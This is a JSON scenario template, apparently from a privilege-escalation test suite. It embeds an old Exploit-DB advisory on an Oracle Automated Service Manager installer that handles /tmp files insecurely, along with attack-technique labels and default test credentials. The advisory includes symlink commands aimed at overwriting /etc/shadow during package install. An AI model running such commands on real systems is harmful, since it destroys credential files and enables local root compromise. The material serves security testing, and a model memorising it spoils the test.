@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_24458",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Oracle Automated Service Manager 1.3 - Installation Privilege Escalation (OSVDB-89823)\n\nExploit source code (24458.txt):\n```\nOracle Automated Service Manager 1.3 local root during install\n\nLarry W. Cashdollar\n1/29/2013\n@_larry0\n\n\nSUNWsasm-1.3.1-20110815093723\n\nhttps://updates.oracle.com/Orion/Services/download?type=readme&aru=15864534\n\nFrom the README:\n\"Oracle Automated Service Manager 1.3.1\n\nOracle Automated Service Manager is the service management container for Auto Service Request and Secure File Transport. It provides platform services (such as logging, data transport and persistence) to business services that are deployed to it.\"\n\nPossible issues with files in /tmp.\n\nroot@dev-unix-sec01:~/test# strings SUNWswasr-4.3.1-20130117131218.rpm |grep tmp\n\n##Read the contents of crontab into a tmp file /usr/bin/crontab -l > /tmp/crontab_edit echo \"0\" > /tmp/tmpVariable\ngrep \"/opt/SUNWswasr/bin/update_rules.sh\" /tmp/crontab_edit |\n\necho \"1\" > /tmp/tmpVariable\ngrep \"0\" /tmp/tmpVariable > /dev/null\n\n        echo >> /tmp/crontab_edit\n        echo \"##Cronjob entry for ASR Auto Rules Update\" >> /tmp/crontab_edit\n        echo \"$min $hour * * * /opt/SUNWswasr/bin/update_rules.sh\" >> /tmp/crontab_edit\n\nASR_STAT_REP=`/bin/grep -c 'bin/asr report' /tmp/crontab_edit`\n\nsed \"/asr report/d\" /tmp/crontab_edit > /tmp/asrtab1.??? mv /tmp/asrtab1.??? /tmp/crontab_edit sed \"/ASR Status Report/d\" /tmp/crontab_edit > /tmp/asrtab1.??? mv /tmp/asrtab1.??? /tmp/crontab_edit ASR_HEARTBEAT=`/bin/grep -c 'bin/asr heartbeat' /tmp/crontab_edit`\n\nsed \"/asr heartbeat/d\" /tmp/crontab_edit > /tmp/asrtab1.??? mv /tmp/asrtab1.??? /tmp/crontab_edit sed \"/ASR Heartbeat/d\" /tmp/crontab_edit > /tmp/asrtab1.??? mv /tmp/asrtab1.??? /tmp/crontab_edit /usr/bin/crontab /tmp/crontab_edit\n## Finally remove the tmp file\nrm -f /tmp/tmpVariable\nrm -f /tmp/crontab_edit\n\ntempFile=/tmp/localsnmp_`date '+%m%d%y%H%M%SOURCE'` /usr/bin/crontab -l > /tmp/asrtab.??\nUPDATE_RULES=`/bin/grep -c 'bin/update_rules.sh' /tmp/asrtab.??`\n\nsed \"/update_rules.sh/d\" /tmp/asrtab.?? > /tmp/asrtab.??? mv /tmp/asrtab.??? /tmp/asrtab.??\nsed \"/ASR Auto Rules/d\" /tmp/asrtab.?? > /tmp/asrtab.??? mv /tmp/asrtab.??? /tmp/asrtab.??\nASR_STAT_HB=`/bin/grep -c 'bin/asr' /tmp/asrtab.??`\n\nsed \"/asr report/d\" /tmp/asrtab.?? > /tmp/asrtab.??? mv /tmp/asrtab.??? /tmp/asrtab.??\nsed \"/ASR Status Report/d\" /tmp/asrtab.?? > /tmp/asrtab.??? mv /tmp/asrtab.??? /tmp/asrtab.??\nsed \"/asr heartbeat/d\" /tmp/asrtab.?? > /tmp/asrtab.??? mv /tmp/asrtab.??? /tmp/asrtab.??\nsed \"/ASR Heartbeat/d\" /tmp/asrtab.?? > /tmp/asrtab.??? mv /tmp/asrtab.??? /tmp/asrtab.??\n/usr/bin/crontab /tmp/asrtab.??\nrm /tmp/asrtab.??\n]!tmpD\nroot@dev-unix-sec01:~/test#\nFirst try, File overwriting vulnerability\n\n$ ln -s /etc/shadow /tmp/mytab-tmp.??\n$ ln -s /etc/shadow /tmp/mytab.??\n\n[root@oracle-lnx-lab02 ~]# rpm -Uvh SUNWsasm-1.3.1-20110815093723.rpm\nPreparing...\n########################################### [100%]\n\nCopyright 2008,2011 Oracle and/or its affiliates. All rights reserved.\n\nLicense and Terms of Use for this software are described at https://support.oracle.com/ (see Terms o f Use)\n\n1:SUNWs\n```",
+  "cve": "OSVDB-89823",
+  "exploitdb_id": "24458",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_24458",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
